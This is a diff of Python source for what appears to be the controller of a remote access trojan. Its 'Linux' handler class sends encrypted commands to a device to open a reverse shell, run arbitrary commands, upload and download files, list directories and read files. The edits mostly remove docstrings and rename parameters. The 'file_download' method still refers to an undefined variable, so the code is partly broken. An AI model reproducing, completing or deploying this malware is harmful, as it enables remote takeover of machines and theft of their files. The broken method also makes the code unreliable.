@@ -16,7 +16,6 @@ class Linux(Base_Handler):
         except socket.error:
             return False
         return True
-    # BASE Features
     def load_module(self, module):
         # Send the Module to the Device
         pass
@@ -35,15 +34,7 @@ class Linux(Base_Handler):
         self.conn.send(self.encrypt(module))
         pass
 
-    def revshell(self, address, port):
-        """Open a Reverse Shell to a given Address:Port
-        Args:
-            address (str): Receiver Address
-            port (int): Receiver Port
-
-        Returns:
-            str: Output or Error Message
-        """
+    def reverse_shell(self, address, port):
         self.conn.send(self.encrypt(f"shell:{address}:{port}"))
         output = self.decrypt(self.conn.recv(1024))
         if output.startswith("!"):
@@ -52,13 +43,6 @@ class Linux(Base_Handler):
             return output
 
     def file_upload(self, fil, path):
-        """Upload a File to a Device
-        Args:
-            fil (string): File to Upload
-            path (string): Path to Upload the File to
-        Returns:
-            str: Output or Error Message
-        """
         f = open(fil, "rb")
         fil = fil.split("/")
         self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
@@ -70,35 +54,19 @@ class Linux(Base_Handler):
         else:
             return output
 
-    def file_download(self, device_path, own_path):
-        """Upload a File to a Device
-        Args:
-            fil (string): File to Upload
-            device_path (string): Path to Download the File from
-            own_path (string): Path to Download the File to
-
-        Returns:
-            str: Output or Error Message
-        """
+    def file_download(self, local_path: str, remote_file:str):
         f = open(fil, "rb")
         fil = fil.split("/")
-        self.conn.send(self.encrypt(f"file-d:{device_path}"))
+        self.conn.send(self.encrypt(f"file-d:{remote_file}"))
         fil = self.conn.recv(1024)
         if fil.startswith("!"):
             raise Exception("Couldn't download the File")
         else:
-            with open(own_path, "wb") as f:
+            with open(local_path, "wb") as f:
                 f.write(fil)
-            return "File Downloaded to " + own_path
+            return "File Downloaded to " + local_path + " ."
 
-    def rce(self, cmd):
-        """Send a Cmd to a Device and return the Output
-        Args:
-            cmd (str): Command to execute
-
-        Returns:
-            str: Output of the command or Error Message
-        """
+    def rce(self, cmd:str):
         self.conn.send(self.encrypt(f"cmd:{cmd}"))
         output = self.decrypt(self.conn.recv(1024))
         return output
@@ -113,13 +81,7 @@ class Linux(Base_Handler):
         output = self.decrypt(self.conn.recv(1024))
         return output
 
-    def get_directory_contents(self, dir):
-        """Get the contents of a directory
-        Args:
-            dir (str): Directory to get the contents of
-        Returns:
-            output (str): Output or Error Message
-        """
+    def get_directory_contents(self, dir:str):
         self.conn.send(self.encrypt(f"dir:{dir}"))
         output = self.decrypt(self.conn.recv(1024))
         if output.startswith("!"):
@@ -127,13 +89,7 @@ class Linux(Base_Handler):
         else:
             return output
 
-    def get_file_contents(self, path):
-        """Get the contents of a File
-        Args:
-            path (str): Path to the File
-        Returns:
-            output (str): Output or Error Message
-        """
+    def get_file_contents(self, path:str):
         self.conn.send(self.encrypt(f"content:{path}"))
         output = self.decrypt(self.conn.recv(1024))
         if output.startswith("!"):
